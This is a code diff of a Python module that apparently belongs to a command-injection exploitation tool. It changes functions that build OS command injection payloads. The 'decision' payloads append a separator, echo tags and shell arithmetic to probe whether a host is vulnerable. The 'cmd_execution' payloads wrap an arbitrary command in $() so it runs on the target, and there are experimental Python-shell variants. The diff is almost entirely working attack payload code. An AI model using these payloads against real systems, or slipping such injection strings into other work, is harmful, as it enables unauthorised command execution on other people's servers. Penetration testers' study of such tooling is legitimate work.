@@ -17,28 +17,29 @@
 # ----------------------------------------------------------
 # Classic decision payload (check if host is vulnerable).
 # ----------------------------------------------------------
-def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
+def decision(separator, TAG, randv1, randv2):
   payload = (separator + 
-            "echo " + TAG + "" +
-            "$(echo " + B64_ENC_TAG + "" + B64_DEC_TRICK + ")" + TAG + ""
+            "echo " + TAG +
+            "$((" + str(randv1) + "%2B" + str(randv2) + "))"  +
+            "$(echo " + TAG + ")" + TAG + ""
              ) 
   return payload
 
 """
 __Warning__: The alternative shells are still experimental.
 """
-def decision_alter_shell(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
+def decision_alter_shell(separator, TAG):
   payload = (separator + 
-            " python -c \"print '" + TAG + "' + '" + B64_ENC_TAG + "' + '" + B64_DEC_TRICK + "' + '" + TAG + "'\""
+            " python -c \"print '" + TAG + "' + '" + TAG + "' + '" + TAG + "' + '" + TAG + "'\""
              ) 
   return payload
 
 # ---------------------------------------------
 # Execute shell commands on vulnerable host.
 # ---------------------------------------------
-def cmd_execution(separator,TAG,cmd):
+def cmd_execution(separator, TAG, cmd):
   payload = (separator + 
-            "echo " + TAG + "" +
+            "echo " + TAG +
             "$(echo " + TAG + ")" +
             "$(" + cmd + ")"+
             "$(echo " + TAG + ")" + TAG + ""
@@ -48,7 +49,7 @@ def cmd_execution(separator,TAG,cmd):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def cmd_execution_alter_shell(separator,TAG,cmd):
+def cmd_execution_alter_shell(separator, TAG, cmd):
   payload = (separator + 
             " python -c \"print'" + TAG + "'+'" + TAG + "'+'$(echo $("+cmd+"))'+'"+ TAG + "'+'" + TAG + "'\""
             )
